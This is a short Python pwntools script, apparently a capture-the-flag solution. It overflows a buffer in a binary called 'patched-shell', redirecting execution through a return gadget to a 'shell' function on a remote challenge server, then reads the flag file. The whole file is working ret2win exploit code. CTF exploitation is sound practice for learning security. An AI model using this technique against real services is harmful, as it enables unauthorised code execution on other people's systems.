from pwn import *

exe = context.binary = ELF('patched-shell')

winaddr = exe.symbols['shell']
retaddr = 0x000000000040101a
payload = fit({
    72: retaddr,
    80: winaddr
})

io = remote('34.134.173.142', 5000)

io.sendline(payload)

io.sendline('cat flag')
print(io.recvline())